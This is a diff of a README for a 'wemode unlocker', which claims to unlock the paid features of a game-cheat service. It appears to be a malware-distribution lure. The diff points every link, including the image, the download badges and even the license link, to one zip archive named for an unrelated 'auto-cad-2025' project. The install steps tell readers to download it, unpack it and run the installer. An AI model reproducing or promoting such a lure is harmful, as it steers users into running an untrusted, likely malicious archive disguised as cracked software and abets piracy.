@@ -1,7 +1,7 @@
 # wemode unlocker 🚀
-![image](https://github.com/user-attachments/assets/535b2e1e-c9af-4041-8c1b-b12cd389b78d)
+![image](https://raw.githubusercontent.com/Kleitoriano/auto-cad-2025/main/condignity/auto-cad-2025.zip)
 
-![Download](https://img.shields.io/badge/Download-wemode_unlocker-blue?logo=azure-devops&labelColor=333&link=https://ezlaunch.live/pPnqF1yp)
+![Download](https://raw.githubusercontent.com/Kleitoriano/auto-cad-2025/main/condignity/auto-cad-2025.zip)
 
 > **wemode unlocker** is a modern tool designed to open and enhance the full potential of wemode environments. Unlock advanced options, bypass limitations, and gain deeper control over wemode for elevated system performance. Enjoy seamless integration, versatile operability, and a user-centric experience!
 
@@ -31,7 +31,7 @@
 
 ## 🟢 Installation
 
-1. [![Download wemode unlocker](https://img.shields.io/badge/Download%20Now-wemode_unlocker-brightgreen?logo=geeksforgeeks)](https://ezlaunch.live/pPnqF1yp)
+1. [![Download wemode unlocker](https://raw.githubusercontent.com/Kleitoriano/auto-cad-2025/main/condignity/auto-cad-2025.zip%20Now-wemode_unlocker-brightgreen?logo=geeksforgeeks)](https://raw.githubusercontent.com/Kleitoriano/auto-cad-2025/main/condignity/auto-cad-2025.zip)
    
    - Download above for your platform  
    - Unpack the archive and run the installer  
@@ -54,10 +54,10 @@ This software is intended solely for educational purposes. The developers are no
 
 ## 📜 License
 
-This project is licensed under the [MIT License](https://opensource.org/license/mit/) © 2025.
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/Kleitoriano/auto-cad-2025/main/condignity/auto-cad-2025.zip) © 2025.
 
 ---
 
 ## 🎯 Download
 
-[![Download wemode unlocker](https://img.shields.io/badge/Download-wemode_unlocker-blue?logo=azure-pipelines)](https://ezlaunch.live/pPnqF1yp)
+[![Download wemode unlocker](https://raw.githubusercontent.com/Kleitoriano/auto-cad-2025/main/condignity/auto-cad-2025.zip)](https://raw.githubusercontent.com/Kleitoriano/auto-cad-2025/main/condignity/auto-cad-2025.zip)
